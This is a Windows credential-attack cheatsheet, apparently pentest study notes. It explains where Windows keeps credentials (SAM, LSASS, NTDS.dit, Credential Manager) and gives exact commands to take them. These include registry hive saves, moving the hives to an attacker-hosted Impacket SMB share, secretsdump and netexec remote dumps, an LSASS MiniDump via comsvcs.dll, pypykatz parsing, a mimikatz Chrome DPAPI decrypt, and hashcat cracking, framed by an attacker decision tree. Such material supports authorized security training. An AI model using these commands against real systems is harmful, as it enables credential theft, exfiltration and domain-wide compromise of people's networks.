# Windows Credential Attacks — Master Cheatsheet

**Core idea:** Windows authenticates users through Winlogon → LogonUI/Credential Provider → LSA/LSASS → an authentication package → either the local SAM or a domain authority. That same pipeline is where all the loot lives: **SAM** (local, disk), **LSASS** (live, memory), **NTDS.dit** (domain, disk), and **Credential Manager** (saved, disk). This sheet covers what each piece is, why it matters, and the exact commands to dump and crack it.

---

## 1. The Authentication Pipeline

```
User
 ↓
Winlogon
 ↓
LogonUI
 ↓
Credential Provider
 ↓
LSA / LSASS
 ↓
Authentication Package
 ↓
SAM (local)  OR  Domain Controller / Active Directory (domain)
 ↓
Accept / Reject
```

| Component | What it is |
|---|---|
| `Winlogon.exe` | Interactive logon coordinator — logon, password change, lock/unlock |
| `LogonUI.exe` | The graphical login interface |
| Credential Provider | Modern mechanism that collects/packages credentials (password, PIN, smart card, Hello, biometrics). GINA is the legacy pre-Vista equivalent — dead, don't treat as modern |
| LSA (Local Security Authority) | Authority for authentication, local security policy, SID translation |
| `LSASS.exe` | The LSA subsystem *process* — `C:\Windows\System32\lsass.exe`. **LSA = authority/concept, LSASS = the process** |
| `Lsasrv.dll` | LSA Server — security package manager |
| `Msv1_0.dll` | MSV1_0 / NTLM authentication package |
| `Kerberos.dll` | Kerberos security package (AD) |
| `Samsrv.dll` | SAM service |
| `Netlogon.dll` | Domain logon / secure channel to DCs |
| `Ntdsa.dll` | AD directory service component (DCs only) |

**Negotiate** — Windows picks Kerberos or NTLM automatically based on context (domain-joined + DC reachable → Kerberos; else → NTLM fallback).

---

## 2. The Four Credential Stores — Mental Map

```
SAM              → LOCAL accounts, on DISK
NTDS.dit         → DOMAIN accounts, on DISK (DC only)
LSASS            → LIVE / active-session material, in MEMORY
Credential Manager → SAVED app/network creds, on DISK (encrypted, per-user)
```

| Store | Path | Contains |
|---|---|---|
| SAM | `C:\Windows\System32\config\SAM` / `HKLM\SAM` | Local user NT/LM hashes |
| SYSTEM | `HKLM\SYSTEM` | Boot key — required to decrypt SAM/SECURITY |
| SECURITY | `HKLM\SECURITY` | Cached domain creds (DCC2), LSA secrets, DPAPI keys |
| LSASS | `lsass.exe` (PID varies) | NT hashes, Kerberos tickets/keys, WDigest (legacy), DPAPI material for the active session |
| NTDS.dit | `C:\Windows\NTDS\ntds.dit` (DC only) | All domain accounts + hashes + AD data |
| Credential Manager | `C:\Users\<user>\AppData\Local\Microsoft\` | Saved logins for RDP, network shares, apps, DPAPI-protected |

Attacker decision tree:

```
Local admin, not domain-relevant?      → SAM + SYSTEM
Domain-joined box, cached creds?       → SECURITY (DCC2)
Active logged-on sessions?             → LSASS
This is a Domain Controller?           → NTDS.dit
Saved app/network creds?               → Credential Manager (DPAPI)
```

---

## 3. Dumping SAM / SYSTEM / SECURITY (offline, local admin)

### 3.1 Save the hives with `reg.exe`

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

- SAM + SYSTEM alone → enough for local hashes.
- Grab SECURITY too → DCC2 (cached domain creds) + LSA secrets + DPAPI keys.

### 3.2 Exfil via Impacket smbserver

```bash
# Attack host — stand up a share
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```

```cmd
:: Target — move the hives out
move sam.save \\<attacker_ip>\CompData
move security.save \\<attacker_ip>\CompData
move system.save \\<attacker_ip>\CompData
```

> `-smb2support` is required — modern Windows won't talk SMBv1.

### 3.3 Parse offline with `secretsdump.py`

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Bootkey (from SYSTEM) is pulled first — it decrypts SAM. Output format:
`uid:rid:lmhash:nthash`

### 3.4 Remote, one-shot (no manual hive pulling)

```bash
# SAM hashes
netexec smb <target_ip> --local-auth -u <user> -p '<pass>' --sam

# LSA secrets (DCC2, DPAPI keys, service passwords)
netexec smb <target_ip> --local-auth -u <user> -p '<pass>' --lsa
```

---

## 4. Cracking Local Hashes (NT/LM)

```bash
# Put NT hashes in a file (one per line)
sudo vim hashestocrack.txt

# Crack with Hashcat mode 1000 = NTLM
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

- `aad3b435b51404eeaad3b435b51404ee` = empty LM hash placeholder, ignore it.
- `31d6cfe0d16ae931b73c59d7e0c089c0` = NT hash of an **empty password** — memorize this constant, it comes up constantly.

---

## 5. DCC2 — Cached Domain Credentials

Found in `HKLM\SECURITY`. Format:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

- PBKDF2-based → **~800x slower** to crack than NTLM. Don't expect rockyou to win against a decent password.
- Cannot be used for Pass-the-Hash — cracking (or nothing) is the only path.

---

## 6. DPAPI

Protects per-user secrets at rest: browser saved passwords, Outlook, RDP saved creds, Credential Manager, VPN/Wi-Fi keys.

```
DPAPI-protected secret → masterkey (derived from user context) → decrypt → usable secret
```

Masterkeys/machine keys are pulled alongside SECURITY hive dumps (`dpapi_machinekey`, `dpapi_userkey`, `NL$KM`).

```cmd
mimikatz # dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

Tools: Impacket `dpapi.py`, Mimikatz `dpapi::`, DonPAPI (remote/mass collection).

---

## 7. Attacking LSASS (live memory)

```
Privileged access → find LSASS PID → dump LSASS → transfer offline → Pypykatz → MSV/WDigest/Kerberos/DPAPI → use/crack
```

### 7.1 Find the PID

```cmd
tasklist /svc
```
```powershell
Get-Process lsass
```

### 7.2 Dump it

**GUI:** Task Manager → Processes → *Local Security Authority Process* → right-click → *Create dump file* (lands in `%TEMP%`).

**CLI:**
```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

> Heavily signatured — modern AV/EDR will very likely flag this. Never dump LSASS without explicit authorization.

### 7.3 Parse with Pypykatz (offline, attack box)

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

### 7.4 What comes out

| Section | What it gives you |
|---|---|
| **MSV** | NT hash (`NT: <hash>`) — the big one, crackable/usable directly |
| **WDigest** | Legacy — plaintext password *if* WDigest UseLogonCredential is enabled (not default on modern Windows) |
| **Kerberos** | TGTs, service tickets, session keys — usable without ever cracking a password (Pass-the-Ticket, later modules) |
| **DPAPI** | Masterkeys for decrypting the user's DPAPI-protected secrets |

```bash
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
```

**Remember:** an NT hash or a Kerberos ticket can often be used *as-is* (Pass-the-Hash / Pass-the-Ticket) — cracking to plaintext isn't always the goal.

### 7.5 Don't assume every session is a distinct account

Multiple `LogonSession` entries for the same username are normal — interactive, RDP, RunAs, services, and scheduled tasks each spawn their own session/LUID.

### 7.6 Modern defenses that shrink your yield

- **LSA Protection (RunAsPPL)** — blocks unauthorized handle access to `lsass.exe`.
- **Credential Guard** — moves secrets into a VBS-isolated LSA instance; a normal LSASS dump gets you far less (or nothing).

```
LSASS dump ≠ guaranteed credentials.
```

---

## 8. Local vs Domain — Don't Mix These Up

```
LOCAL ACCOUNT  → SAM            (per-machine)
DOMAIN ACCOUNT → NTDS.dit       (on the DC, via AD)
```

```
Workgroup: Computer A and Computer B each keep their own local accounts.
Domain:    DC → Active Directory → PC01 / PC02 / Server (centrally managed)
```

NTDS.dit compromise = domain-wide, not one box — treat it as the highest-value target on any DC.

---

## 9. Must-Remember Commands

```cmd
:: Find LSASS
tasklist /svc
```
```powershell
Get-Process lsass
```
```cmd
:: Save hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

:: Dump LSASS
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```
```bash
# Exfil share
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/

# Offline hive parse
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote one-shot
netexec smb <ip> --local-auth -u <user> -p '<pass>' --sam
netexec smb <ip> --local-auth -u <user> -p '<pass>' --lsa

# LSASS dump parse
pypykatz lsa minidump /path/to/lsass.dmp

# Cracking
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt   # NTLM
hashcat -m 2100 '<DCC2_hash>' /usr/share/wordlists/rockyou.txt        # DCC2
```

---

## 10. Universal Memory Block

```
1. Where am I?            → local box vs DC
2. What privilege?        → local admin needed for all of this
3. Disk or memory target? → SAM/NTDS = disk, LSASS = memory
4. Pull it                → reg.exe save / MiniDump / netexec
5. Get it off box          → smbserver / netexec built-in transfer
6. Parse offline           → secretsdump / pypykatz
7. Hash or ticket?         → hash → crack (hashcat), ticket → maybe usable as-is
8. Crack                   → mode 1000 (NTLM) / mode 2100 (DCC2)
9. Reuse                   → password reuse across hosts, PtH, PtT
```

---

## 11. One-Line Mental Model

> Windows keeps credentials in four places — SAM (local disk), NTDS.dit (domain disk), LSASS (live memory), and Credential Manager (saved, DPAPI-wrapped) — and every credential attack is really just: get privileged access to one of these four, pull it offline, and either crack it or use it directly.
